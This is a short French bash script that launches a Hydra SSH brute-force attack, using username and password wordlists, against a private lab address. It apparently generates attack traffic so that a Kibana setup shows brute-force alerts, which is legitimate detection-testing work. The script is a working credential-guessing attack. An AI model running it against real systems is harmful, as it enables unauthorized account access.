#!/bin/bash

# Configuration
TARGET="192.168.56.101"
USER_LIST="txt/small_username.txt" #PEUT ETRE CHANGE EN FONCTION DU FICHIER A UTILISER
PASS_LIST="txt/small_password.txt"

echo "================================================================"
echo " DÉBUT DU TEST D'INTRUSION : BRUTE FORCE SSH (HYDRA)"
echo " Cible : $TARGET"
echo "================================================================"

if [ ! -f "$PASS_LIST" ]; then
    echo "[-] Erreur : Le dictionnaire $PASS_LIST est introuvable."
    exit 1
fi

echo "[+] Fichier de mots de passe trouvé : $PASS_LIST"

if [ ! -f "$USER_LIST" ]; then
    echo "[-] Liste d'utilisateurs introuvable dans $USER_LIST."
fi
echo "[+] Fichier d'utilisateurs prêt : $USER_LIST"

echo ""
echo "---> Lancement de Hydra en cours ..."
echo "---> Cela va générer de multiples paquets SYN vers le port 22."
echo ""

hydra -L $USER_LIST -P $PASS_LIST ssh://$TARGET -t 4

echo ""
echo "================================================================"
echo " TEST TERMINÉ !"
echo " Allez rafraîchir l'onglet Discover dans Kibana pour voir"
echo " les alertes 'SSH Brute-Force attaque'."
echo "================================================================"